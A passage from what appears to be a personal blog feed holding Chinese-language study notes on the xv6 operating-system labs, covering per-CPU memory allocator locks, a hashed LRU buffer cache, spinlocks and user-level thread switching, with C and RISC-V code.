class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string s = <span class="string">&quot;abcd&quot;</span>;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    string res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        res += s[i % <span class="number">4</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
          <category> 暑期集训 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 暑期集训 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XV6 0x8</title>
      <link href="/2024/07/10/OS/xv6_0x8/"/>
      <url>/2024/07/10/OS/xv6_0x8/</url>
      
        <content type="html"><![CDATA[<h1 id="lab8"><a href="#lab8" class="headerlink" title="lab8"></a>lab8</h1><h3 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h3><p>coordination   ——sleep/wake</p><ul><li>pipes</li><li>disk read</li><li>wait</li></ul><p><strong>broken sleep</strong>：在无锁状态下，中断处理提前调用了 <code>wakeup(void *chan)</code>，当 <code>sleep(void* chan, struct spinlock *lk)</code> 执行时，<code>wakeup(void *chan)</code> 已经执行完毕，导致进程持续睡眠。因此<code>sleep(void* chan, struct spinlock *lk)</code>是原子的，在释放锁的同时将进程睡眠。</p><p>进程结束，父进程为什么要<code>wait</code>：</p><ul><li>因为子进程无法释放自己的堆栈。</li><li>父进程可以获取子进程的退出码，并根据退出码决定接下来的操作。例如，如果子进程出现错误，父进程可能需要重新启动子进程或执行一些错误处理逻辑。</li><li>方便进行进程同步</li></ul><h3 id="Memory-allocator-moderate"><a href="#Memory-allocator-moderate" class="headerlink" title="Memory allocator(moderate)"></a>Memory allocator(moderate)</h3><p>我们将内存分配器的锁分配给每个CPU，同时，初始化锁。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">spinlock</span> lock;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">run</span> *freelist;</span><br><span class="line">&#125; kmem[NCPU];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">kinit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> lockname[<span class="number">10</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>; i &lt; NCPU; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">snprintf</span>(lockname, <span class="built_in">sizeof</span>(lockname), <span class="string">&quot;kmem_%d&quot;</span>, i);</span><br><span class="line">      <span class="built_in">initlock</span>(&amp;kmem[i].lock, <span class="string">&quot;kmem&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">freerange</span>(end, (<span class="type">void</span>*)PHYSTOP);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配内存，从当前CPU空闲列表查找，若找到空闲内存，则分配给进程。若找不到。则从其他进程空闲列表获取。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">kalloc</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">run</span> *r;</span><br><span class="line">  <span class="built_in">push_off</span>();</span><br><span class="line">  <span class="type">int</span> id = <span class="built_in">cpuid</span>();</span><br><span class="line">  <span class="built_in">pop_off</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">acquire</span>(&amp;kmem[id].lock);</span><br><span class="line">  r = kmem[id].freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmem[id].freelist = r-&gt;next;</span><br><span class="line">   <span class="built_in">release</span>(&amp;kmem[id].lock);</span><br><span class="line">  <span class="keyword">if</span>(!r)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; NCPU; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">acquire</span>(&amp;kmem[i].lock);</span><br><span class="line">      r = kmem[i].freelist;</span><br><span class="line">      <span class="keyword">if</span>(r) </span><br><span class="line">      &#123;</span><br><span class="line">        kmem[i].freelist = r-&gt;next;</span><br><span class="line">        <span class="built_in">release</span>(&amp;kmem[i].lock);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">release</span>(&amp;kmem[i].lock);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span>*)r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>kfree将内存插入当前CPU空闲列表中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">kfree</span><span class="params">(<span class="type">void</span> *pa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">run</span> *r;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="type">char</span>*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;kfree&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill with junk to catch dangling refs.</span></span><br><span class="line">  <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">  r = (<span class="keyword">struct</span> run*)pa;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">push_off</span>();</span><br><span class="line">  <span class="type">int</span> id = <span class="built_in">cpuid</span>();</span><br><span class="line">  <span class="built_in">pop_off</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">acquire</span>(&amp;kmem[id].lock);</span><br><span class="line">  r-&gt;next = kmem[id].freelist;</span><br><span class="line">  kmem[id].freelist = r;</span><br><span class="line">  <span class="built_in">release</span>(&amp;kmem[id].lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Buffer-cache-hard"><a href="#Buffer-cache-hard" class="headerlink" title="Buffer cache(hard)"></a>Buffer cache(hard)</h3><p>这个好难啊Qwq，只能去搬救兵了</p><p>首先我们将tick标识添加到buf</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">buf</span> &#123;</span><br><span class="line">  <span class="type">int</span> valid;   <span class="comment">// has data been read from disk?</span></span><br><span class="line">  <span class="type">int</span> disk;    <span class="comment">// does disk &quot;own&quot; buf?</span></span><br><span class="line">  uint dev;</span><br><span class="line">  uint blockno;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">sleeplock</span> lock;</span><br><span class="line">  uint refcnt;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">buf</span> *prev; <span class="comment">// LRU cache list</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">buf</span> *next;</span><br><span class="line">  uchar data[BSIZE];</span><br><span class="line">  uint ticks;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>定义哈希桶，按照指南设置大小为奇数13可以减少获取锁的冲突。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_SIZE 13</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义散列桶</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">hash_table</span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">spinlock</span> lock;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">buf</span> head;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">hash_table</span> hash_table[HASH_SIZE];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">buf</span> buf[NBUF];</span><br><span class="line">&#125; bcache;</span><br></pre></td></tr></table></figure><p>初始化，依旧是相同的配方，我们只为一个桶分配内存，当其他哈希桶没有内存时来此窃取。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">binit</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">buf</span> *b;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> lockname[<span class="number">20</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>; i &lt; HASH_SIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">snprintf</span>(lockname, <span class="built_in">sizeof</span>(lockname), <span class="string">&quot;bcache_%d&quot;</span>, i);</span><br><span class="line">      <span class="built_in">initlock</span>(&amp;hash_table[i].lock, lockname);</span><br><span class="line">      hash_table[i].head.prev = &amp;hash_table[i].head;</span><br><span class="line">      hash_table[i].head.next = &amp;hash_table[i].head;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(b = bcache.buf; b &lt; bcache.buf+NBUF; b++)&#123;    <span class="comment">//头插法</span></span><br><span class="line">    b-&gt;next = hash_table[<span class="number">0</span>].head.next;</span><br><span class="line">    b-&gt;prev = &amp;hash_table[<span class="number">0</span>].head;</span><br><span class="line">    <span class="built_in">initsleeplock</span>(&amp;b-&gt;lock, <span class="string">&quot;buffer&quot;</span>);</span><br><span class="line">    hash_table[<span class="number">0</span>].head.next-&gt;prev = b;</span><br><span class="line">    hash_table[<span class="number">0</span>].head.next = b;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>首先遍历当前散列桶，若遍历到该元素，则返回该元素地址</li><li>若没有遍历到，则我们需要为该元素分配空间。遍历整个哈希表，寻找引用计数为0且最后访问时间最早的缓存块。</li><li>插入缓存块</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">buf</span>*</span><br><span class="line"><span class="built_in">bget</span>(uint dev, uint blockno)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">buf</span> *b;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//acquire(&amp;bcache.lock);</span></span><br><span class="line">  <span class="type">int</span> hash_blockno = blockno % HASH_SIZE;</span><br><span class="line">  <span class="built_in">acquire</span>(&amp;hash_table[hash_blockno].lock);</span><br><span class="line">  <span class="keyword">for</span>(b = hash_table[hash_blockno].head.next; b != &amp;hash_table[hash_blockno].head; b = b-&gt;next)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">if</span>(b-&gt;dev == dev &amp;&amp; b-&gt;blockno == blockno)&#123;</span><br><span class="line">        b-&gt;refcnt++;</span><br><span class="line"></span><br><span class="line">         <span class="built_in">acquire</span>(&amp;tickslock);</span><br><span class="line">        b-&gt;ticks = ticks;</span><br><span class="line">        <span class="built_in">release</span>(&amp;tickslock);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">release</span>(&amp;hash_table[hash_blockno].lock);</span><br><span class="line">        <span class="built_in">acquiresleep</span>(&amp;b-&gt;lock);</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    b = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">buf</span>* tmp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = hash_blockno, cycle = <span class="number">0</span>; cycle != HASH_SIZE; i = (i + <span class="number">1</span>) % HASH_SIZE)</span><br><span class="line">    &#123;</span><br><span class="line">      ++cycle;</span><br><span class="line">      <span class="keyword">if</span>(i != hash_blockno)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">holding</span>(&amp;hash_table[i].lock))</span><br><span class="line">          <span class="built_in">acquire</span>(&amp;hash_table[i].lock);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span>(tmp = hash_table[i].head.next; tmp != &amp;hash_table[i].head; tmp = tmp-&gt;next)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">if</span>(tmp-&gt;refcnt == <span class="number">0</span> &amp;&amp; (b == <span class="number">0</span> || tmp-&gt;ticks &lt; b-&gt;ticks))</span><br><span class="line">            b = tmp;</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(b)&#123;</span><br><span class="line">      <span class="keyword">if</span>(i != hash_blockno)&#123;</span><br><span class="line">           b-&gt;next-&gt;prev = b-&gt;prev;</span><br><span class="line">           b-&gt;prev-&gt;next = b-&gt;next;</span><br><span class="line">           <span class="built_in">release</span>(&amp;hash_table[i].lock);</span><br><span class="line"></span><br><span class="line">           b-&gt;next = hash_table[hash_blockno].head.next;</span><br><span class="line">           b-&gt;prev = &amp;hash_table[hash_blockno].head;</span><br><span class="line">           hash_table[hash_blockno].head.next-&gt;prev = b;</span><br><span class="line">           hash_table[hash_blockno].head.next = b;</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">      b-&gt;dev = dev;</span><br><span class="line">      b-&gt;blockno = blockno;</span><br><span class="line">      b-&gt;valid = <span class="number">0</span>;</span><br><span class="line">      b-&gt;refcnt = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">acquire</span>(&amp;tickslock);</span><br><span class="line">      b-&gt;ticks = ticks;</span><br><span class="line">      <span class="built_in">release</span>(&amp;tickslock);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">release</span>(&amp;hash_table[hash_blockno].lock);</span><br><span class="line">      <span class="built_in">acquiresleep</span>(&amp;b-&gt;lock);</span><br><span class="line">      <span class="keyword">return</span> b;</span><br><span class="line">     </span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(i != hash_blockno)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">release</span>(&amp;hash_table[i].lock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">panic</span>(<span class="string">&quot;bget: no buffers&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改brelse，将ticks写入buf结构体，用以实现LRU。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">brelse</span><span class="params">(<span class="keyword">struct</span> buf *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">holdingsleep</span>(&amp;b-&gt;lock))</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;brelse&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> hash_blockno = b-&gt;blockno % HASH_SIZE;</span><br><span class="line">  <span class="built_in">releasesleep</span>(&amp;b-&gt;lock);</span><br><span class="line">  <span class="built_in">acquire</span>(&amp;hash_table[hash_blockno].lock);</span><br><span class="line">    b-&gt;refcnt--;</span><br><span class="line">    <span class="built_in">acquire</span>(&amp;tickslock);</span><br><span class="line">    b-&gt;ticks = ticks;</span><br><span class="line">    <span class="built_in">release</span>(&amp;tickslock);</span><br><span class="line">  <span class="built_in">release</span>(&amp;hash_table[hash_blockno].lock);</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">bpin</span><span class="params">(<span class="keyword">struct</span> buf *b)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> hash_blockno = b-&gt;blockno % HASH_SIZE;</span><br><span class="line">  <span class="built_in">acquire</span>(&amp;hash_table[hash_blockno].lock);</span><br><span class="line">    b-&gt;refcnt++;</span><br><span class="line">  <span class="built_in">release</span>(&amp;hash_table[hash_blockno].lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">bunpin</span><span class="params">(<span class="keyword">struct</span> buf *b)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> hash_blockno = b-&gt;blockno % HASH_SIZE;</span><br><span class="line">  <span class="built_in">acquire</span>(&amp;hash_table[hash_blockno].lock);</span><br><span class="line">    b-&gt;refcnt--;</span><br><span class="line">  <span class="built_in">release</span>(&amp;hash_table[hash_blockno].lock);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
          <category> xv6 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> xv6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XV6 0x7</title>
      <link href="/2024/07/08/OS/xv6_0x7/"/>
      <url>/2024/07/08/OS/xv6_0x7/</url>
      
        <content type="html"><![CDATA[<h1 id="lab7"><a href="#lab7" class="headerlink" title="lab7"></a>lab7</h1><h3 id="mutex"><a href="#mutex" class="headerlink" title="mutex"></a>mutex</h3><p>锁的好处：</p><ul><li>锁可以避免更新丢失</li><li>使多步操作成为原子操作 </li><li>锁帮助维护不变量</li></ul><p>错误使用锁的问题：</p><ul><li><p>死锁（deadlock）        ——改用顺序获取释放锁</p></li><li><p>模块化（modularity）       </p></li><li>性能（performance）      ——拆分数据结构</li></ul><p>锁实现：</p><ul><li>通过硬件实现锁获取的原子性</li><li><code>关闭中断</code>，例如当线程获取锁进入临界区，在临界区产生中断，而<code>中断处理程序</code>也需要获取该，从而产生死锁</li></ul><p><code>_sync_lock_test_and_set</code> 是 GNU Compiler Collection (GCC) 提供的一种原子操作函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">acquire：</span><br><span class="line"><span class="keyword">while</span>(_sync_lock_test_and_set(&amp;lk_&gt;locked, <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">    ;</span><br><span class="line">在locked原子地写入<span class="number">1</span>，但是返回之前的值，若之前的值等于<span class="number">0</span>（没人拿到过锁），代表该进程成功获得锁，退出循环</span><br><span class="line">__sync_synchronize();</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">__sync_synchronize();</span><br><span class="line"></span><br><span class="line">__sync_lock_release(&amp;lk-&gt;locker);</span><br><span class="line">release</span><br></pre></td></tr></table></figure><p><code>__sync_synchronize()</code> 会发出一个全内存屏障，确保在屏障之前的所有内存操作（包括加载和存储）都已完成，并且对之后的操作可见。</p><ul><li><p>死锁：当线程1获得文件A的锁，定时器中断导致切换到线程2，线程2也请求获得该锁，导致发生死锁（除非线程1成功释放文件A的锁,，线程2因为获取锁的时候关闭中断导致无法切换线程）</p></li><li><p>无锁编程：无锁编程通过使用原子操作和其他同步机制来避免这些问题，从而提高并发性能和可伸缩性。</p></li></ul><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p><strong>线程——序列化地执行、寄存器、PC、栈</strong></p><ul><li><p>多线程交织</p><ul><li>多核cpu</li></ul></li></ul><ul><li>线程切换（线程通常多余cpu数）</li></ul><ul><li><p>共享内存 ——&gt; 共享数据结果需要锁      </p><ul><li><p>xv6 内核线程 —— yes</p></li><li><p>xv6 用户线程 —— no   因为xv6并没有实现线程</p></li><li><p>Linux 用户线程 —— yes     在linux，线程就是共享内存的进程</p></li></ul></li></ul><p>不同任务之间共享一台计算机</p><ul><li>事件驱动编程</li><li>状态机</li></ul><p>线程实现</p><ul><li>线程切换——调度器（scheduling）</li><li>保存什么寄存器</li><li><p>如何处理计算密集型</p><ul><li>时钟中断——&gt;内核——&gt;另一线程    </li><li>PRE-EMPTIVE SCHEDULING（抢占式调度）</li></ul></li><li><p>THREAD“STATE”</p><ul><li><p>RUNNING</p></li><li><p>RUNNABLE</p></li><li><p>SLEEPING</p></li></ul></li></ul><p>context上下文切换</p><ol><li>yield()，定时中断引发中断</li><li>sched()，确认中断条件</li><li>swtch，保存部分寄存器</li><li>scheduler，寻找处于RUNNABLE的进程</li><li>swtch，保存部分寄存器</li><li>sched(),返回</li><li>yileld()</li></ol><p>swtch实际类似于函数调用</p><ul><li><p>没有保存pc，因为它是一个可预测的值（我们知道要返回到ra寄存器执行）</p></li><li><p>保存不是调用者保存的寄存器（不保存全部寄存器）</p></li><li>不用c编程是c难以访问特定寄存器</li><li>我们需要锁使得上面五个步骤是原子性的。部分操作要禁止中断。</li></ul><h3 id="Uthread-switching-between-threads-moderate"><a href="#Uthread-switching-between-threads-moderate" class="headerlink" title="Uthread: switching between threads (moderate)"></a>Uthread: switching between threads (moderate)</h3><p>模仿进程切换保存寄存器。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.globl thread_switch</span><br><span class="line">thread_switch:</span><br><span class="line"></span><br><span class="line">  sd ra, <span class="number">0</span>(a0)</span><br><span class="line">        sd sp, <span class="number">8</span>(a0)</span><br><span class="line">        sd s0, <span class="number">16</span>(a0)</span><br><span class="line">        sd s1, <span class="number">24</span>(a0)</span><br><span class="line">        sd s2, <span class="number">32</span>(a0)</span><br><span class="line">        sd s3, <span class="number">40</span>(a0)</span><br><span class="line">        sd s4, <span class="number">48</span>(a0)</span><br><span class="line">        sd s5, <span class="number">56</span>(a0)</span><br><span class="line">        sd s6, <span class="number">64</span>(a0)</span><br><span class="line">        sd s7, <span class="number">72</span>(a0)</span><br><span class="line">        sd s8, <span 